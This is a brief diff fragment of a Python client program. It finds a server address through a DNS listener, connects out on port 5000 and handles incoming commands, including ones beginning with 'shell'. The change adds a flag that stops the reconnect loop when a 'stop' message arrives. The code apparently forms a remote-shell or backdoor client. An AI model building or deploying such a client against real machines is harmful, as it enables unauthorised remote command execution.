@@ -11,12 +11,12 @@ def cmd(c):
 
 def client_program():
     global shell
+    running = True
     ip = listen_dns()
 
     port = 5000  # socket server port number
 
-    while True:
-        print("Connecting to", ip)
+    while running:
         try:
             client_socket = socket.socket()  # instantiate
             client_socket.connect((ip, port))  # connect to the server
@@ -24,6 +24,7 @@ def client_program():
             while True:
                 data = client_socket.recv(1024).decode()
                 if data == "stop" or data == "":
+                    running = False
                     break
                 if data.startswith("shell"):
                     a = data.split(" ")
